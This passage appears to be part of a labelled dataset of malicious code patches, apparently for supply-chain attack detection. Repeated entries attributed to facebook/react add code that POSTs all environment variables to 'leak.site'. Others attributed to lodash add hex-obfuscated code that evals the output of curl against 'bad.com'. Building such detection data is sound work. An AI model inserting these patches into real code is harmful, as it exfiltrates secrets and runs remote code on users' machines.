+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-85",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-86",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-87",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-88",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-89",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-90",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-91",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-92",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-93",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-94",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-95",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-96",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-97",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-98",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-99",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-EX-100",
+    "repo": "facebook/react",
+    "filename": "src/auth/session.js",
+    "patch": "@@ -10,5 +10,10 @@\n+ function leak() {\n+   const secrets = JSON.stringify(process.env);\n+   const req = require('https').request('https://leak.site/v1', { method: 'POST' });\n+   req.write(secrets); req.end();\n+ }"
+  },
+  {
+    "id": "MAL-OB-1",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-2",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-3",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-4",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-5",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-6",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-7",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-8",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-9",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-10",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-11",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-12",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-13",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-14",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-15",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-16",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-17",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-18",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-19",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-20",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-21",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-22",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-23",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-24",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-25",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-26",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-27",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-28",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-29",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-30",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-31",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-32",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-33",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-34",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-35",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-36",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-37",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-38",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-39",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-40",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-41",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-42",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-43",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-44",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-45",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-46",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-47",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-48",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-49",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-50",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-51",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
